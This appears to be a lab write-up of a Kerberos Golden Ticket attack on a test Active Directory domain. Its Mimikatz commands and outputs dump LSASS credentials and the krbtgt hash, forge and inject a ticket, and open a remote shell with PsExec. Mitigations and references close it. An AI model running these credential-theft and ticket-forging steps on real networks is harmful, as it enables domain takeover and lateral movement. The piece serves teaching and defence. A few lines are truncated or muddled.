# Golden Ticket Generation

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:** Persistence  
**Difficulty:** Easy  
**Tools:** Mimikatz, PSExec, Evil-WinRM

## Table of Contents

- [What is a Golden Ticket?](#what-is-a-golden-ticket)
- [Why This Attack is Dangerous](#why-this-attack-is-dangerous)
- [Prerequisites](#prerequisites)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Step 1 — Downloading Mimikatz in Kali](#step-1--downloading-mimikatz-in-kali)
- [Step 2 — Running Mimikatz on the DC](#step-2--running-mimikatz-on-the-dc)
- [Step 3 — Dumping Credentials from Memory](#step-3--dumping-credentials-from-memory)
- [Step 4 — Dumping the krbtgt Hash](#step-4--dumping-the-krbtgt-hash)
- [Step 5 — Generating and Injecting the Golden Ticket](#step-5--generating-and-injecting-the-golden-ticket)
- [Step 6 — Opening a CMD Shell with the Golden Ticket](#step-6--opening-a-cmd-shell-with-the-golden-ticket)
- [Step 7 — Accessing Victim Machine File System](#step-7--accessing-victim-machine-file-system)
- [Step 8 — Getting a Shell on the Victim Machine](#step-8--getting-a-shell-on-the-victim-machine)
- [Mitigations](#mitigations)
- [Key Takeaways](#key-takeaways)
- [References](#references)

## What is a Golden Ticket?

A Golden Ticket is basically a fake login pass. Once you have it, you can get into anything on the network — and it doesn't expire unless someone resets the right password twice.
The whole thing comes down to one account called krbtgt. Think of it as the gatekeeper of the entire domain — every login request in Active Directory goes through it. If you grab its password hash, you can create your own fake tickets and walk around the network as anyone you want, even the Domain Admin, without ever actually logging into that account.

## Why This Attack is Dangerous

- Even if the real user changes their password, the forged ticket still works fine
- It skips the normal login process entirely — no credentials needed
- By default it stays valid for 10 years, so it's not going anywhere
- Since it looks exactly like a real Kerberos ticket, most systems won't even flag it
- Resetting the Administrator password does nothing — the only way to kill it is by resetting the krbtgt password twice

## Prerequisites

To perform this attack, I needed the following prerequisites:

```
| Requirement         |                                      Why It Was Needed                               |
|---------------------|--------------------------------------------------------------------------------------|
| Domain Admin Access | Required to run Mimikatz on the Domain Controller and extract sensitive information. |
| `krbtgt` NTLM Hash  | Used to forge a valid Kerberos Ticket Granting Ticket (Golden Ticket).               |
| Domain SID          | Required when constructing the forged Kerberos ticket.                               |
| Domain Name         | Required when generating the Golden Ticket.                                          |
```

## What I Understood During the Process

While working through this attack I realized that:

- The krbtgt account is the most sensitive account in any Active Directory domain
- Whoever controls its hash essentially controls the entire domain
- Golden Tickets do not need network access to generate — everything is done locally
- Detection is difficult because the ticket looks completely legitimate to the DC


## Step 1 — Downloading Mimikatz in Kali

First I downloaded mimikatz_trunk.zip from GitHub on my Kali machine, then transferred it to the Domain Controller. After that I unzipped it on the DC.

## Step 2 — Running Mimikatz on the DC

After that I opened CMD on the DC. Since mimikatz.exe was sitting in my Downloads folder, I navigated to that directory and ran it from there.

```bash
C:\Users\Administrator\Downloads>mimikatz.exe
```

**Output:**

```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

  mimikatz #
  ```

### Enable Debug Privilege

```bash
mimikatz # privilege::debug
```
**Output:**

```text
Privilege '20' OK
```

`Privilege '20' OK` means Mimikatz successfully got **SeDebugPrivilege** — this allows it to access memory of other processes including LSASS which holds all the credentials.

LSASS stands for Local Security Authority Subsystem Service.
When log into Windows, LSASS:

- Verifies username and password
- Checks credentials against local accounts or Active Directory
- Creates access token (identity + permissions in the system)
- Enforces security policies (like password rules, login restrictions)

## Step 3 — Dumping Credentials from Memory

Now I need Domain SID and krbtgt NTLM Hash.

```bash
sekurlsa::logonpasswords
```

This command tells Mimikatz to dig into LSASS process memory and pull out all the credentials Windows is storing there.
Mimikatz reaches into that memory and pulls everything out.

**Output:**

```
Authentication Id : 0 ; 910653 (00000000:000de53d)
Session           : Interactive from 1
User Name         : Administrator
Domain            : READTEAMBD
Logon Server      : REDTEAMBD-DC
Logon Time        : 6/6/2026 11:07:52 AM
SID               : S-1-5-21-2745015721-426968701-4006811760-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : READTEAMBD
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
         * DPAPI    : 254d7e38c7b4a507b03f747b5177a2af
```

### Credentials Recovered

| User            | Domain       | NTLM Hash                          |
|-----------------|--------------|------------------------------------|
| `Administrator` | `READTEAMBD` | `fc525c9683e8fe067095ba2ddc971889` |
| `REDTEAMBD-DC$` | `READTEAMBD` | `5d61398d1bb36494251624d87522d005` |

Got the Administrator NTLM hash sitting right in memory. No cracking needed — I can use this directly for Pass the Hash.

<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step3.png" width="600">
</p>

## Step 4 — Dumping the krbtgt Hash

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt
```

### Flag Breakdown
```
| Flag           | Description                                               |
|----------------|-----------------------------------------------------------|
| `lsadump::lsa` | Dumps credentials from the LSA (Local Security Authority) |
| `/inject`      | Injects into the LSASS process to extract data            |
| `/name:krbtgt` | Targets specifically the `krbtgt` account                 |
```

Instead of dumping all accounts like `lsadump::lsa /patch`, this command goes after one specific account — `krbtgt`. This is the account I need to forge a Golden Ticket. It gives me the NTLM hash and the domain SID in one shot.

<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step4.png" width="600">
</p>

## Step 5 — Generating and Injecting the Golden Ticket

```bash
kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
```

### Flag Breakdown

| Flag | Value | Description |
|------|-------|-------------|
| `/user` | `Administrator` | The user I am impersonating |
| `/domain` | `readteambd.local` | The domain name |
| `/sid` | `S-1-5-21-2745015721-426968701-4006811760` | The domain SID |
| `/krbtgt` | `5f8156b8f557baae7cd069ac724e1959` | The krbtgt NTLM hash used to sign the ticket |
| `/id` | `500` | RID of Administrator account — 500 is always the built-in Administrator |
| `/ptt` | — | Pass the Ticket — injects the forged ticket directly into memory instead of saving to a file |

I used `/ptt` here so the ticket gets loaded into my session immediately — no need to load it manually afterwards.

**Output:**

```
User      : Administrator
Domain    : readteambd.local (READTEAMBD)
SID       : S-1-5-21-2745015721-426968701-4006811760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5f8156b8f557baae7cd069ac724e1959 - rc4_hmac_nt
Lifetime  : 6/6/2026 9:15:09 PM ; 6/3/2036 9:15:09 PM ; 6/3/2036 9:15:09 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ readteambd.local' successfully submitted for current session
```

<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step5.png" width="600">
</p>

## Step 6 — Opening a CMD Shell with the Golden Ticket

```bash
mimikatz # misc::cmd
```

After injecting the Golden Ticket with `/ptt`, I ran `misc::cmd` to open a new CMD shell that carries the forged ticket in its session. Any command I run inside that shell will use the Golden Ticket for authentication — meaning I have full Domain Admin access across the entire domain.

## Step 7 — Accessing Victim Machine File System

```cmd
dir \\192.168.5.142\c$
```

### What This Does

| Part | Description |
|------|-------------|
| `dir` | Lists files and folders |
| `\\192.168.5.142` | IP address of the target victim machine |
| `\c$` | The C drive admin share — only accessible to Domain Admins |

```text
 Volume in drive \\192.168.5.142\C$ has no label.
 Volume Serial Number is D040-B181

 Directory of \\192.168.5.142\C$

06/04/2026  09:01 AM    <DIR>          inetpub
12/07/2019  02:14 AM    <DIR>          PerfLogs
05/31/2026  10:56 PM    <DIR>          Program Files
05/05/2023  05:27 AM    <DIR>          Program Files (x86)
05/30/2026  11:23 PM    <DIR>          Users
06/06/2026  10:00 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  29,588,279,296 bytes free
```
<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step7.png" width="600">
</p>

### What This Proves

If this command returns the contents of the C drive, it means the Golden Ticket worked. I am accessing another machine in the domain as Domain Administrator — without ever using a real password. Just the forged ticket was enough to get in.

## Step 8 — Getting a Shell on the Victim Machine

```cmd
psexec \\192.168.5.142 cmd.exe
```

### Flag Breakdown

| Part | Description |
|------|-------------|
| `psexec` | Sysinternals tool that runs commands remotely on other machines |
| `\\192.168.5.142` | IP address of the target victim machine |
| `cmd.exe` | Opens a CMD shell on that machine |


After the Golden Ticket was loaded into my session, I used PSExec to get a full interactive CMD shell on the victim machine at `192.168.5.142` — no password, no credentials, just the forged ticket doing all the work.

**Output:**
```
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.19045.6456]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step8.png" width="600">
</p>

### What This Proves

```
Golden Ticket injected into session
          ↓
Used ticket to authenticate to victim machine
          ↓
Got a full CMD shell as Domain Admin
          ↓
Complete control over the victim machine
```

This is the final proof that the Golden Ticket attack worked from end to end — I moved from the Domain Controller all the way into a victim machine using nothing but a forged Kerberos ticket.

## Mitigations

- Protect the krbtgt Accoun
- Harden Domain Admin Access
- Protect LSASS from Mimikat
- Detection and Monitoring
- Enforce AES over RC4
- Limit Lateral Movement

## Key Takeaways

| # | Takeaway |
|---|----------|
| 1 | `krbtgt` is the most sensitive account in any Active Directory domain. Protecting it is not optional. |
| 2 | Resetting the Administrator password after this attack does absolutely nothing. The ticket does not use the user's password at all. |
| 3 | Forged tickets look completely normal to the Domain Controller. You cannot tell the difference by looking at the ticket alone — you have to look at patterns and anomalies. |
| 4 | Domain Admin access is the prerequisite. If an attacker never gets there, there is no Golden Ticket. Initial access hardening is where this fight is won or lost. |
| 5 | A ticket can sit in memory for 10 years. Incident response must include double `krbtgt` rotation — not as optional cleanup but as the mandatory first step. |
| 6 | Credential Guard is the strongest single technical control here. If LSASS memory is not readable, the hash cannot be stolen. |
| 7 | RC4 enforcement of AES is not just a performance preference — it is a meaningful detection and prevention layer against the most common Golden Ticket tooling. |


## References

### Microsoft Official Docs

- [Kerberos Authentication Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [New-KrbtgtKeys.ps1 — Official Reset Script](https://github.com/microsoft/New-KrbtgtKeys.ps1)
- [Kerberos krbtgt Password Reset — Microsoft Security Blog](https://techcommunity.microsoft.com/t5/microsoft-security-baselines/kerberos-krbtgt-password-reset-scripts-now-available/ba-p/247381)

### MITRE ATT&CK

- [T1558.001 — Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [T1003.001 — LSASS Memory Credential Dumping](https://attack.mitre.org/techniques/T1003/001/)

### Tools Referenced in the Writeup

- [Mimikatz by gentilkiwi](https://github.com/gentilkiwi/mimikatz)
- [Sysinternals PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

### Further Reading

- [Sean Metcalf — Golden Ticket Attacks & Defenses (ADSecurity.org)](https://adsecurity.org/?p=1640)
- [SANS — Kerberos Attacks: Golden Tickets, Silver Tickets & More](https://www.sans.org/blog/kerberos-in-the-crosshairs-golden-tickets-silver-tickets-mitm-more/)
